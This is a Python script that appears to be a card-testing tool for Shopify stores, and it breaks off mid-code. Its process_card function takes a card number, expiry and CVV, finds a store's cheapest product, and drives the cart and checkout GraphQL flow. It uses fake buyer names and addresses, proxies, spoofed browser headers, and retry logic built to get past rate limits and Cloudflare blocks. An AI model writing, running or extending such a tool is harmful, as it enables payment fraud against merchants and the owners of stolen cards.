import asyncio
import aiohttp
import json
import re
import random
import argparse
from urllib.parse import urlparse
from flask import Flask, request, jsonify
import os
import time

# --- SIMPLIFIED QUERIES TO FIX "TYPE NO LONGER SUPPORTED" ERROR ---
QUERY_PROPOSAL_SHIPPING = """query Proposal($alternativePaymentCurrency:AlternativePaymentCurrencyInput,$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,$sessionInput:SessionTokenInput!,$checkpointData:String,$queueToken:String,$reduction:ReductionInput,$availableRedeemables:AvailableRedeemablesInput,$changesetTokens:[String!],$tip:TipTermInput,$note:NoteInput,$localizationExtension:LocalizationExtensionInput,$nonNegotiableTerms:NonNegotiableTermsInput,$scriptFingerprint:ScriptFingerprintInput,$transformerFingerprintV2:String,$optionalDuties:OptionalDutiesInput,$attribution:AttributionInput,$captcha:CaptchaInput,$poNumber:String,$saleAttributions:SaleAttributionsInput){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{alternativePaymentCurrency:$alternativePaymentCurrency,delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,reduction:$reduction,availableRedeemables:$availableRedeemables,tip:$tip,note:$note,poNumber:$poNumber,nonNegotiableTerms:$nonNegotiableTerms,localizationExtension:$localizationExtension,scriptFingerprint:$scriptFingerprint,transformerFingerprintV2:$transformerFingerprintV2,optionalDuties:$optionalDuties,attribution:$attribution,captcha:$captcha,saleAttributions:$saleAttributions},checkpointData:$checkpointData,queueToken:$queueToken,changesetTokens:$changesetTokens}){__typename result{...on NegotiationResultAvailable{checkpointData queueToken sellerProposal{...ProposalDetails __typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on Throttled{pollAfter queueToken pollUrl __typename}...on NegotiationResultFailed{__typename}__typename}errors{code localizedMessage nonLocalizedMessage __typename}__typename}}fragment ProposalDetails on Proposal{delivery{...on FilledDeliveryTerms{deliveryLines{availableDeliveryStrategies{...on CompleteDeliveryStrategy{handle amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}__typename}payment{...on FilledPaymentTerms{availablePaymentLines{placements paymentMethod{...on PaymentProvider{paymentMethodIdentifier name extensibilityDisplayName __typename}...on OffsiteProvider{paymentMethodIdentifier name __typename}...on CustomOnsiteProvider{paymentMethodIdentifier name __typename}...on CustomerCreditCardPaymentMethod{paymentMethodIdentifier __typename}...on PaypalBillingAgreementPaymentMethod{paymentMethodIdentifier __typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tax{...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}merchandise{...on FilledMerchandiseTerms{merchandiseLines{totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}"""

QUERY_PROPOSAL_DELIVERY = """query Proposal($alternativePaymentCurrency:AlternativePaymentCurrencyInput,$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,$sessionInput:SessionTokenInput!,$checkpointData:String,$queueToken:String,$reduction:ReductionInput,$availableRedeemables:AvailableRedeemablesInput,$changesetTokens:[String!],$tip:TipTermInput,$note:NoteInput,$localizationExtension:LocalizationExtensionInput,$nonNegotiableTerms:NonNegotiableTermsInput,$scriptFingerprint:ScriptFingerprintInput,$transformerFingerprintV2:String,$optionalDuties:OptionalDutiesInput,$attribution:AttributionInput,$captcha:CaptchaInput,$poNumber:String,$saleAttributions:SaleAttributionsInput){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{alternativePaymentCurrency:$alternativePaymentCurrency,delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,reduction:$reduction,availableRedeemables:$availableRedeemables,tip:$tip,note:$note,poNumber:$poNumber,nonNegotiableTerms:$nonNegotiableTerms,localizationExtension:$localizationExtension,scriptFingerprint:$scriptFingerprint,transformerFingerprintV2:$transformerFingerprintV2,optionalDuties:$optionalDuties,attribution:$attribution,captcha:$captcha,saleAttributions:$saleAttributions},checkpointData:$checkpointData,queueToken:$queueToken,changesetTokens:$changesetTokens}){__typename result{...on NegotiationResultAvailable{checkpointData queueToken sellerProposal{...ProposalDetails __typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on Throttled{pollAfter queueToken pollUrl __typename}...on NegotiationResultFailed{__typename}__typename}errors{code localizedMessage nonLocalizedMessage __typename}__typename}}fragment ProposalDetails on Proposal{delivery{...on FilledDeliveryTerms{deliveryLines{availableDeliveryStrategies{...on CompleteDeliveryStrategy{handle amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}__typename}payment{...on FilledPaymentTerms{availablePaymentLines{placements paymentMethod{...on PaymentProvider{paymentMethodIdentifier name extensibilityDisplayName __typename}...on OffsiteProvider{paymentMethodIdentifier name __typename}...on CustomOnsiteProvider{paymentMethodIdentifier name __typename}...on CustomerCreditCardPaymentMethod{paymentMethodIdentifier __typename}...on PaypalBillingAgreementPaymentMethod{paymentMethodIdentifier __typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tax{...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}merchandise{...on FilledMerchandiseTerms{merchandiseLines{totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}"""

MUTATION_SUBMIT = """mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{errors{...on NegotiationError{code localizedMessage nonLocalizedMessage __typename}__typename}__typename}...on Throttled{pollAfter pollUrl queueToken __typename}...on CheckpointDenied{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl __typename}...on ProcessingReceipt{id pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}__typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on OrderCreationSchedulingFailure{__typename}...on DiscountUsageLimitExceededFailure{__typename}...on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}"""

QUERY_POLL = """query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl __typename}...on ProcessingReceipt{id pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}__typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on OrderCreationSchedulingFailure{__typename}...on DiscountUsageLimitExceededFailure{__typename}...on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}"""

C2C = {
    "USD": "US",
    "CAD": "CA", 
    "INR": "IN",
    "AED": "AE",
    "HKD": "HK",
    "GBP": "GB",
    "CHF": "CH",
}

book = {
    "US": {"address1": "123 Main", "city": "NY", "postalCode": "10080", "zoneCode": "NY", "countryCode": "US", "phone": "2194157586"},
    "CA": {"address1": "88 Queen", "city": "Toronto", "postalCode": "M5J2J3", "zoneCode": "ON", "countryCode": "CA", "phone": "4165550198"},
    "GB": {"address1": "221B Baker Street", "city": "London", "postalCode": "NW1 6XE", "zoneCode": "LND", "countryCode": "GB", "phone": "2079460123"},
    "IN": {"address1": "221B MG", "city": "Mumbai", "postalCode": "400001", "zoneCode": "MH", "countryCode": "IN", "phone": "+91 9876543210"},
    "AE": {"address1": "Burj Tower", "city": "Dubai", "postalCode": "", "zoneCode": "DU", "countryCode": "AE", "phone": "+971 50 123 4567"},
    "HK": {"address1": "Nathan 88", "city": "Kowloon", "postalCode": "", "zoneCode": "KL", "countryCode": "HK", "phone": "+852 5555 5555"},
    "CN": {"address1": "8 Zhongguancun Street", "city": "Beijing", "postalCode": "100080", "zoneCode": "BJ", "countryCode": "CN", "phone": "1062512345"},
    "CH": {"address1": "Gotthardstrasse 17", "city": "Schweiz", "postalCode": "6430", "zoneCode": "SZ", "countryCode": "CH", "phone": "445512345"},
    "AU": {"address1": "1 Martin Place", "city": "Sydney", "postalCode": "2000", "zoneCode": "NSW", "countryCode": "AU", "phone": "291234567"},
    "DEFAULT": {"address1": "123 Main", "city": "New York", "postalCode": "10080", "zoneCode": "NY", "countryCode": "US", "phone": "2194157586"},
}

def pick_addr(url, cc=None, rc=None):
    cc = (cc or "").upper()
    rc = (rc or "").upper()
    dom = urlparse(url).netloc
    tcn = dom.split('.')[-1].upper()

    if tcn in book:
        return book[tcn]

    ccn = C2C.get(cc)

    if rc in book and ccn == rc:
        return book[rc]
    elif rc in book:
        return book[rc]
    return book["DEFAULT"]

def capture(data, first, last):
    try:
        start = data.index(first) + len(first)
        end = data.index(last, start)
        return data[start:end]
    except ValueError:
        return None

def extract_between(text, start, end):
    if not text or not start or not end:
        return None
    try:
        if start in text:
            parts = text.split(start, 1)
            if len(parts) > 1:
                if end in parts[1]:
                    result = parts[1].split(end, 1)[0]
                    return result if result else None
        return None
    except Exception:
        return None

class Utils:
    @staticmethod
    def get_random_name():
        first_names = ["James", "John", "Robert", "Michael", "William", "David", "Mary", "Patricia", "Jennifer", "Linda"]
        last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez"]
        return (random.choice(first_names), random.choice(last_names))
    
    @staticmethod
    def generate_email(first, last):
        domains = ["gmail.com", "yahoo.com", "outlook.com", "protonmail.com"]
        return f"{first.lower()}.{last.lower()}@{random.choice(domains)}"

def parse_proxy(proxy_str):
    if not proxy_str:
        return None
    
    parts = proxy_str.split(':')
    
    if len(parts) == 2:
        ip, port = parts
        return f"http://{ip}:{port}"
    elif len(parts) == 4:
        ip, port, user, password = parts
        return f"http://{user}:{password}@{ip}:{port}"
    else:
        return None

def is_captcha_required(response_text):
    if not response_text:
        return False
    
    indicators = [
        'CAPTCHA_REQUIRED',
        '"code":"CAPTCHA_REQUIRED"',
        "'code':'CAPTCHA_REQUIRED'",
        '"message":"CAPTCHA_REQUIRED"',
        'captcha required',
        'CAPTCHA CHALLENGE',
        'hcaptcha',
        'h-captcha'
    ]
    
    text_upper = response_text.upper()
    for indicator in indicators:
        if indicator.upper() in text_upper:
            return True
    return False

BLOCKED_RESPONSE_INDICATORS = (
    'just a moment',
    'cf-chl-bypass',
    'cf-challenge',
    'attention required',
    'checking your browser',
    'access denied',
    'enable javascript',
    'please enable cookies',
    'your request has been blocked',
    'forbidden',
    'rate limit',
    'too many requests',
)

async def _is_bad_response(response, response_text):
    if response is None:
        return True
    if not response_text or not response_text.strip():
        return True
    try:
        if response.status in (403, 429, 503):
            return True
    except Exception:
        return True
    head = response_text[:400].lstrip().lower()
    if head.startswith('<') or head.startswith('<!doctype') or head.startswith('<?xml'):
        return True
    for ind in BLOCKED_RESPONSE_INDICATORS:
        if ind in head:
            return True
    try:
        json.loads(response_text)
    except Exception:
        return True
    return False

async def make_graphql_request_with_captcha_handling(
    session, graphql_url, params, headers, json_data,
    checkout_url, max_retries=3, solve_captcha=True, proxy=None
):
    last_response = None
    last_text = ""

    for attempt in range(max_retries + 1):
        try:
            response = await session.post(
                graphql_url, params=params, headers=headers, json=json_data,
                proxy=proxy
            )
            response_text = await response.text()
        except Exception as e:
            last_response = None
            last_text = str(e)
            if attempt < max_retries:
                await asyncio.sleep(2.0 * (attempt + 1) + random.uniform(1, 2))
                continue
            return None, str(e), False

        last_response = response
        last_text = response_text

        if await _is_bad_response(response, response_text):
            if attempt < max_retries:
                status = getattr(response, 'status', 0)
                if status == 429:
                    retry_after = response.headers.get('Retry-After')
                    sleep_time = int(retry_after) if (retry_after and retry_after.isdigit()) else (5.0 * (attempt + 1) + random.uniform(2, 4))
                    await asyncio.sleep(sleep_time)
                else:
                    await asyncio.sleep(2.0 + attempt * 1.5 + random.uniform(1, 2))
                continue
            return response, response_text, False

        return response, response_text, False

    return last_response, last_text, False

BROWSER_HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0',
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'en-US,en;q=0.9',
    'Accept-Encoding': 'gzip, deflate, br',
    'Connection': 'keep-alive',
    'sec-ch-ua': '"Chromium";v="146", "Not_A.Brand";v="24", "Microsoft Edge";v="146"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

PRODUCT_HEADERS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
]

PRODUCT_ENDPOINTS = [
    "/products.json",
    "/collections/all.json",
    "/collections/all/products.json",
]

LOW_PRICE_THRESHOLD = 5.00
MIN_PRICE = 0.10

def _parse_price_str(raw_price):
    if raw_price is None:
        return 0.0
    try:
        s = str(raw_price).strip().replace(',', '')
        if not s:
            return 0.0
        return float(s)
    except (ValueError, TypeError):
        return 0.0

async def _fetch_with_backoff(session, method, url, proxy, headers=None, max_retries=4, timeout_sec=15):
    for attempt in range(max_retries):
        try:
            kwargs = {}
            if proxy:
                kwargs['proxy'] = proxy
            if headers:
                kwargs['headers'] = headers
            async with session.request(
                method, url, timeout=aiohttp.ClientTimeout(total=timeout_sec),
                allow_redirects=True, **kwargs
            ) as resp:
                if resp.status in (429, 503):
                    retry_after = resp.headers.get('Retry-After')
                    wait = int(retry_after) if (retry_after and retry_after.isdigit()) else min(2 ** attempt + random.uniform(0.5, 1.5), 20)
                    await asyncio.sleep(wait)
                    continue
                return resp
        except Exception:
            if attempt == max_retries - 1:
                return None
            await asyncio.sleep(1 + random.uniform(0, 1))
    return None

async def fetch_products(domain, proxy_str=None, max_pages=5):
    try:
        if not domain.startswith('http'):
            domain = "https://" + domain

        proxy = parse_proxy(proxy_str) if proxy_str else None
        start_time = time.time()
        total_budget = 10

        def budget_left():
            return max(1, total_budget - (time.time() - start_time))

        ua = random.choice(PRODUCT_HEADERS)
        browser_headers = {
            'User-Agent': ua,
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'sec-ch-ua': '"Chromium";v="146", "Not_A.Brand";v="24", "Microsoft Edge";v="146"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
        }

        connector = aiohttp.TCPConnector(ssl=False, force_close=False, limit=20, limit_per_host=10)
        timeout = aiohttp.ClientTimeout(
            total=min(10, budget_left()),
            connect=min(5, budget_left()),
            sock_connect=min(5, budget_left()),
            sock_read=min(10, budget_left()),
        )

        def pick_best(results):
            low_price = float('inf')
            low_product = None
            any_price = float('inf')
            any_product = None
            for product in results:
                if not product.get('variants'):
                    continue
                for variant in product['variants']:
                    if not variant.get('available', True):
                        continue
                    try:
                        price = variant.get('price', '0')
                        if isinstance(price, str):
                            price = float(price.replace(',', ''))
                        else:
                            price = float(price)
                        if price >= MIN_PRICE and price < any_price:
                            any_price = price
                            any_product = {
                                'site': domain,
                                'price': f"{price:.2f}",
                                'variant_id': str(variant['id']),
                                'link': f"{domain}/products/{product['handle']}"
                            }
                        if price >= MIN_PRICE and price <= LOW_PRICE_THRESHOLD and price < low_price:
                            low_price = price
                            low_product = {
                                'site': domain,
                                'price': f"{price:.2f}",
                                'variant_id': str(variant['id']),
                                'link': f"{domain}/products/{product['handle']}"
                            }
                    except (ValueError, TypeError, AttributeError):
                        continue
            if isinstance(low_product, dict) and low_product.get('variant_id'):
                return low_product
            if isinstance(any_product, dict) and any_product.get('variant_id'):
                return any_product
            return None

        try:
            async with aiohttp.ClientSession(
                connector=connector, timeout=timeout, headers=browser_headers
            ) as session:

                async def try_products_url(url):
                    if time.time() - start_time >= total_budget - 2:
                        return None
                    try:
                        async with session.get(
                            url, proxy=proxy,
                            timeout=aiohttp.ClientTimeout(total=min(5, budget_left())),
                            allow_redirects=True
                        ) as resp:
                            if resp.status == 200:
                                try:
                                    text = await resp.text()
                                    if 'search.json' in url:
                                        try:
                                            d = json.loads(text)
                                            results = d.get('results', d.get('products', []))
                                            return results if results else None
                                        except Exception:
                                            return None
                                    data = json.loads(text) if not text.startswith('<') else {}
                                    products = data.get('products', [])
                                    return products if products else None
                                except Exception:
                                    return None
                            if resp.status == 429:
                                return '429'
                            if resp.status == 404:
                                return '404'
                            if resp.status in (403, 503):
                                return 'block'
                            return 'other'
                    except Exception:
                        return None

                for endpoint in PRODUCT_ENDPOINTS:
                    if time.time() - start_time >= total_budget - 2:
                        break
                    result = await try_products_url(f"{domain}{endpoint}")
                    if isinstance(result, list) and result:
                        best = pick_best(result)
                        if best:
                            return best
                    elif result == '429' or result == 'block':
                        break
                    elif result == '404':
                        continue
                    await asyncio.sleep(random.uniform(0.5, 1.5))

                search_term = await try_products_url(f"{domain}/search.json?q=&type=product")
                if isinstance(search_term, list) and search_term:
                    best = pick_best(search_term)
                    if best:
                        return best

                if time.time() - start_time >= total_budget - 3:
                    return False, "<b>Proxied IP Blocked - Try Different Proxy</b>"

                sf_query = (
                    '{"query":"{ products(first: 250, sortKey: PRICE, reverse: false) {'
                    ' edges { node { id handle title onlineStoreUrl '
                    ' variants(first: 50) { edges { node { id availableForSale price { amount currencyCode } } } } } } } }"}'
                )
                try:
                    async with session.post(
                        f"{domain}/api/2024-01/graphql.json",
                        proxy=proxy,
                        timeout=aiohttp.ClientTimeout(total=min(6, budget_left())),
                        data=sf_query,
                        headers={
                            'Content-Type': 'application/json',
                            'Accept': 'application/json',
                            'Origin': domain,
                            'Referer': domain,
                        },
                    ) as resp:
                        if resp.status == 200:
                            try:
                                data = await resp.json()
                                edges = data.get('data', {}).get('products', {}).get('edges', [])
                                if edges:
                                    low_price = float('inf')
                                    low_product = None
                                    any_price = float('inf')
                                    any_product = None
                                    detected_currency = None
                                    for edge in edges:
                                        node = edge.get('node', {})
                                        handle = node.get('handle', '')
                                        for v_edge in node.get('variants', {}).get('edges', []):
                                            v_node = v_edge.get('node', {})
                                            try:
                                                price_obj = v_node.get('price', {}) or {}
                                                price_val = price_obj.get('amount', '0')
                                                price = float(price_val)
                                                if not v_node.get('availableForSale', True):
                                                    continue
                                                if not detected_currency:
                                                    detected_currency = price_obj.get('currencyCode')
                                                if price >= MIN_PRICE and price < any_price:
                                                    any_price = price
                                                    vid = v_node.get('id', '').split('/')[-1]
                                                    any_product = {
                                                        'site': domain,
                                                        'price': f"{price:.2f}",
                                                        'currency': detected_currency,
                                                        'variant_id': str(vid),
                                                        'link': f"{domain}/products/{handle}"
                                                    }
                                                if price >= MIN_PRICE and price <= LOW_PRICE_THRESHOLD and price < low_price:
                                                    low_price = price
                                                    vid = v_node.get('id', '').split('/')[-1]
                                                    low_product = {
                                                        'site': domain,
                                                        'price': f"{price:.2f}",
                                                        'currency': detected_currency,
                                                        'variant_id': str(vid),
                                                        'link': f"{domain}/products/{handle}"
                                                    }
                                            except (ValueError, TypeError, AttributeError):
                                                continue
                                    if isinstance(low_product, dict) and low_product.get('variant_id'):
                                        return low_product
                                    if isinstance(any_product, dict) and any_product.get('variant_id'):
                                        return any_product
                            except Exception:
                                pass
                except Exception:
                    pass

                return False, "<b>Proxied IP Blocked - Try Different Proxy</b>"

        except Exception as e:
            return False, f"error: {str(e)[:80]}"

    except Exception as e:
        return False, f"error: {str(e)[:80]}"

def extract_clean_response(message):
    if not message:
        return "UNKNOWN_ERROR"
    
    message = str(message)
    
    patterns = [
        r'(PAYMENTS_[A-Z_]+)',
        r'(CARD_[A-Z_]+)',
        r'([A-Z]+_[A-Z]+_[A-Z_]+)',
        r'([A-Z]+_[A-Z_]+)',
        r'code["\']?\s*[:=]\s*["\']?([^"\',]+)["\']?',
        r'{"code":"([^"]+)"',
        r"'code':'([^']+)'"
    ]
    
    for pattern in patterns:
        matches = re.findall(pattern, message, re.IGNORECASE)
        for match in matches:
            if isinstance(match, tuple):
                match = match[0]
            if match and "_" in match and len(match) < 50:
                match = match.strip("{}:'\" ")
                return match
    
    words = message.split()
    if words:
        first_word = words[0]
        if "_" in first_word and first_word.isupper():
            return first_word
    
    return message[:50]

async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None):
    gateway = "UNKNOWN"
    total_price = "0.00"
    currency = "USD"

    ourl = site_url if site_url.startswith('http') else f'https://{site_url}'
    displayName = ""
    payment_identifier = None
    proxy = parse_proxy(proxy_str) if proxy_str else None
    checkpoint_data = None
    running_total = "0.00"
    scraped_price = None

    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Content-Type': 'application/json',
            'Origin': ourl,
            'Referer': ourl,
            'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"'
        }

        address_info = pick_addr(ourl)
        country_code = address_info["countryCode"]
        
        firstName, lastName = Utils.get_random_name()
        email = Utils.generate_email(firstName, lastName)
        
        phone = address_info["phone"]
        street = address_info["address1"]
        city = address_info["city"]
        state = address_info["zoneCode"]
        s_zip = address_info["postalCode"]
        address2 = ""

        if not variant_id:
            info = await fetch_products(ourl, proxy_str)
            if isinstance(info, tuple) and info[0] is False:
                return False, info[1], gateway, total_price, currency
            variant_id = info['variant_id']
            scraped_price = info.get('price')
            scraped_currency = info.get('currency')
            if scraped_price:
                total_price = scraped_price
            if scraped_currency and (not currency or currency == "USD"):
                currency = scraped_currency

        connector = aiohttp.TCPConnector(ssl=False)
        timeout = aiohttp.ClientTimeout(total=30)
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            url = ourl
            cart = url + '/cart/add.js'
            checkout = url + '/checkout/'

            cart_headers = {
                **headers,
                'Content-Type': 'application/x-www-form-urlencoded',
                'Accept': 'application/json, text/javascript'
            }
            cart_resp = await session.post(cart, data=f'id={variant_id}&quantity=1', headers=cart_headers, proxy=proxy)
            
            if cart_resp.status != 200:
                cart_headers_alt = {
                    **headers,
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                }
                cart_data = {'items': [{'id': int(variant_id), 'quantity': 1}]}
                cart_resp = await session.post(cart, json=cart_data, headers=cart_headers_alt, proxy=proxy)
            
            if cart_resp.status != 200:
                return False, f"Cart failed with status {cart_resp.status}", gateway, total_price, currency

            checkout_headers = {
                **headers,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1'
            }
            response = await session.post(url=checkout, allow_redirects=True, headers=checkout_headers, proxy=proxy)
            checkout_url = str(response.url)

            attempt_token_match = re.search(r'/checkouts/cn/([^/?]+)', checkout_url)
            attempt_token = attempt_token_match.group(1) if attempt_token_match else checkout_url.split('/')[-1].split('?')[0]

            sst = response.headers.get('X-Checkout-One-Session-Token') or response.headers.get('x-checkout-one-session-token')
            
            text = await response.text()
            if not sst:
                sst = extract_between(text, 'name="serialized-sessionToken" content="&quot;', '&quot;')
                if not sst:
                    sst = extract_between(text, 'name="serialized-sessionToken" content="', '"')
                if not sst:
                    sst = extract_between(text, '"serializedSessionToken":"', '"')
                if not sst:
                    sst = extract_between(text, 'data-session-token="', '"')
                if not sst:
                    sst = extract_between(text, '"sessionToken":"', '"')
            
            if 'login' in checkout_url.lower():
                return False, "Site requires login!", gateway, total_price, currency

            queueToken = extract_between(text, 'queueToken&quot;:&quot;', '&quot;') or extract_between(text, '"queueToken":"', '"')
            stableId = extract_between(text, 'stableId&quot;:&quot;', '&quot;') or extract_between(text, '"stableId":"', '"')
            
            merch = extract_between(text, 'ProductVariantMerchandise/', '&quot;') or \
                    extract_between(text, 'ProductVariantMerchandise/', '&q') or \
                    extract_between(text, '"merchandiseId":"gid://shopify/ProductVariantMerchandise/', '"')
            if not merch:
                merch = str(variant_id)
            
            currency = 'USD'
            if 'currencyCode&quot;:&quot;' in text:
                currency = extract_between(text, 'currencyCode&quot;:&quot;', '&quot;') or 'USD'
            elif '"currencyCode":"' in text:
                currency = extract_between(text, '"currencyCode":"', '"') or 'USD'
            
            subtotal = extract_between(text, 'subtotalBeforeTaxesAndShipping&quot;:{&quot;value&quot;:{&quot;amount&quot;:&quot;', '&quot;') or \
                     extract_between(text, '"subtotalBeforeTaxesAndShipping":{"value":{"amount":"', '"')

            if not subtotal and scraped_price:
                try:
                    if float(scraped_price) > 0:
                        subtotal = scraped_price
                except (ValueError, TypeError):
                    pass

            if not subtotal:
                buyer_price = extract_between(text, '"buyerProposal":{...subtotal":{"value":{"amount":"', '"')
                if not buyer_price:
                    buyer_price = extract_between(text, '"subtotal":{"value":{"amount":"', '"')
                if buyer_price:
                    try:
                        if float(buyer_price) > 0:
                            subtotal = buyer_price
                    except (ValueError, TypeError):
                        pass

            if not subtotal:
                price_match = re.search(r'"price":\s*"([\d.]+)"', text)
                cand = price_match.group(1) if price_match else None
                if cand:
                    try:
                        v = float(cand)
                        if v >= 0.10 and v < 100000:
                            subtotal = cand
                    except (ValueError, TypeError):
                        pass

            if not subtotal and scraped_price:
                try:
                    if float(scraped_price) >= 0.10:
                        subtotal = scraped_price
                except (ValueError, TypeError):
                    pass

            if not subtotal:
                subtotal = scraped_price if scraped_price else "1.00"

            unescaped_text = text.replace('&quot;', '"').replace('&amp;', '&').replace('&#39;', "'")
            
            build_id = None
            build_match = re.search(r'"commitSha"\s*:\s*"([a-f0-9]{40})"', unescaped_text)
            if build_match:
                build_id = build_match.group(1)
            
            source_token = extract_between(text, 'name="serialized-sourceToken" content="', '"')
            if source_token:
                source_token = source_token.replace('&quot;', '').strip('"')
            
            ident_sig = None
            ident_match = re.search(r'checkoutCardsinkCallerIdentificationSignature":"([^"]+)"', unescaped_text)
            if ident_match:
                ident_sig = ident_match.group(1)
            
            if not sst:
                return False, "Failed to get session token", gateway, total_price, currency
            
            headers.update({
                'shopify-checkout-client': 'checkout-web/1.0',
                'shopify-checkout-source': f'id="{attempt_token}", type="cn"',
                'x-checkout-one-session-token': sst,
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
            })
            if build_id:
                headers['x-checkout-web-build-id'] = build_id
                headers['x-checkout-web-deploy-stage'] = 'production'
                headers['x-checkout-web-server-handling'] = 'fast'
                headers['x-checkout-web-server-rendering'] = 'yes'
            if source_token:
                headers['x-checkout-web-source-id'] = source_token

            params = {'operationName': 'Proposal'}
            
            json_data = {
                'query': QUERY_PROPOSAL_SHIPPING,
                'variables': {
                    'sessionInput': {'sessionToken': sst},
                    'queueToken': queueToken or '',
                    'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
                    'delivery': {
                        'deliveryLines': [{
                            'destination': {
                                'partialStreetAddress': {
                                    'address1': street, 'address2': address2, 'city': city,
                                    'countryCode': country_code, 'postalCode': s_zip,
                                    'firstName': firstName, 'lastName': lastName,
